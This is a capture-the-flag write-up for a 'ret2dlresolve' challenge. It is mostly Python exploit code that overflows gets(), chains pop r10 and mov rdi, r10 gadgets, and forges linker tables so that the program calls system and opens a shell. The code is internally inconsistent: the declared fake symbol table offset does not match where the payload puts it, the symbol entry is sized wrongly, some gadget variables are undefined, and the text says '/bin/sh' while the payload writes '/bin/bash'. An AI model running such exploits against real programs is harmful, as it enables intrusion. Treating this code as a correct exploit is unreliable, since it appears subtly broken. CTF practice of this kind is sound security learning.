# ret2dlresolve

## Solution

The binary suffers from an overflow
```
0040122b  488d45f8           lea     rax, [rbp-0x8 {var_10}]
0040122f  4889c7             mov     rdi, rax {var_10}
00401232  b800000000         mov     eax, 0x0
00401237  e814feffff         call    gets
```
There does not appear to be any tools in the binary that would be helpful for an exploit. It appears to be a perfect opportunity for ret2dlresolve. There is just one minor hickup: we do not have a `pop rdi` gadget at our disposal, rendering most automated tools to be useless. But, we have some other tools to get around this fact:
```
0040118d  415a               pop     r10 {var_8}
0040118f  c3                 retn     {__return_addr}
```
```
00401190  4c89d7             mov     rdi, r10
00401193  c3                 retn     {__return_addr}
```
Thus, we can make a gadget that runs `pop r10` and then runs `mov rdi, r10`, populating `rdi` with what we want.

We look through the binary and locate the locations of the initialize plt function, the symbol table, the string lookup table, and the jump relative table.
```python
init_plt = 0x401020
symbtab = 0x4003d0
strtab = 0x4004a8
jmp_rel = 0x4005d0
```
Then, we location an address in memory to wrte what we want to:
```python
writeable_mem = 0x0404e10
fake_strtab = writeable_mem
fake_symbtab = writeable_mem + 0x18
fake_rel = writeable_mem + 0x38
fake_args = writeable_mem + 0x50
```
Next, we resolve the array indexes needed to trick the array lookups.
```python
assert (fake_rel - jmp_rel) % 24 == 0
dl_resolve_index = int((fake_rel - jmp_rel) / 24)
assert (fake_symbtab - symbtab) % 24 == 0
r_info = int((fake_symbtab - symbtab) / 24) << 32 | 0x7
st_shndex = fake_strtab - strtab
```
We then start the chain to call `gets` with our writeable memory as a parameter so that we can later write what we want to memory.
```python
chain = cyclic(16)
chain += p64(ret) # Stops mov_aps nonsense
chain += p64(pop_r10)
chain += p64(fake_strtab)
chain += p64(mov_rdi_r10)
chain += p64(e.plt['gets'])
```
Then, we can setup the call to init plt with our fake argument being provided. This call is what will allow us to make a call to system.
```python
# Creates call to init_plt
chain += p64(pop_r10)
chain += p64(fake_args)
chain += p64(mov_rdi_r10)
chain += p64(init_plt)

# Adds custom entry number
chain += p64(dl_resolve_index)
p.sendline(chain)
```
Now, we can assemble what we want to write to memory during the `gets` call. First, we provide the string `system`, as that is the function we want to call. Then, we define the structure of the symbol table entry. Next, we add the entry in the relative plt table. Finally, we add the string `/bin/sh` to be used by the call to system. Thus, we get the following payload:
```python
# Adds string to memory
payload = b'system\x00\x00'

# Adds symbol table entry
payload += p64(0x0)
payload += p64(0x0)
payload += p64(st_shndex)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)

# Adds rel table
payload += p64(fake_strtab)
payload += p64(r_info)
payload += p64(0x0)

# Adds /bin/bash to be called by system
payload += b'/bin/bash\x00'
p.sendline(payload)
```
Thus, we now obtain shell on the binary, which we use to obtain the flag.